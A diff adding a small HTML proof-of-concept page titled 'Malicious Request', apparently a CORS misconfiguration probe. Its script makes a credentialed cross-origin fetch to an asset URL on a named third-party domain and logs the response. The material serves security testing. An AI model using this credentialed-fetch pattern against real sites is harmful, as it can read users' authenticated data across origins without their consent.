@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Request</title>
+</head>
+<body>
+    <script>
+        fetch('https://assets.circle.com/stablecoin/assets/javascripts/gom-latn.js', {
+            method: 'GET',
+            credentials: 'include',
+            mode: 'cors'
+        })
+        .then(response => response.text())
+        .then(data => console.log('Data:', data))
+        .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
